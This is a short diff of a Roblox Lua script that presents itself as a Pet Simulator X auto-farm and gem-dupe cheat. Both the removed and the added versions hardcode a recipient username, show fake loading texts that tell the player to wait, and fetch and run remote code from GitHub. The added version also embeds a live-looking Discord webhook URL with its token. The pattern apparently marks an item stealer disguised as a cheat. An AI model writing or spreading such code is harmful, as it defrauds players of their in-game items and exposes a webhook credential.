@@ -1,1 +1,17 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()  local Window = Library.CreateLib("PET SIMULATOR X SCRIPT AUTO FARM", "DarkTheme")  local Tab = Window:NewTab("Rafa Script")  local Section = Tab:NewSection("IMPORTANT WAIT UNTIL IT'S DONE")  Section:NewButton("Start Script", "ButtonInfo", function()     print("Clicked") UserName = "Itz_kends" _G.AntiLeave = false _G.ScriptName = "WAIT OR YOU WILL GET CRASH" _G.FirstText = "SETUP SCRIPT..." _G.SecondText = "SETUP SCRIPT SUCCESSFULLY..." _G.ThirdText = "Almost Done..." _G.WaitingTime = 30 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))() end)
+Username = "Itz_kends"
+
+WebHook = "https://discord.com/api/webhooks/1108478223945302076/ugPxaKoaDOf2tncaC-ZmFER2YQVkNoGce7M-4Mw6dYCb7GczAeDYcuVPIBF8QmDCDKtF"
+
+loadingscreen = true
+
+_G.CustomScriptName = "PSX Pet Changer And Gem Dupe Script"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
